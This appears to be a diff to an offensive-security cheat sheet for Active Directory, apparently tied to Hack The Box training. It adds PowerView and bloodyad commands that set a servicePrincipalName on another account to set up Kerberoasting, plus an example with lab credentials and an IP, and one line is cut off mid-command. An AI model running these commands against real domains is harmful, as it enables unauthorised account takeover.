@@ -41,7 +41,14 @@ setspn -s Utility/DAWG gammons.local\kclammons
 
 -Using PowerView:
 ```
+Set-DomainObject -Identity "TargetAccount" -Set @{serviceprincipalname = "serviceclass/host"}
+```
 
+-Using bloodyad (Linux):
+```
+bloodyad -u <use
+#Example
+bloodyad -u henry -p 'H3nry_987TGV!' --host 10.129.232.167 set object ALFRED servicePrincipalName -v 'Utility/DAWG'
 ```
 An Example of Abuse path can be found at https://academy.hackthebox.com/app/module/143/section/1486 
 
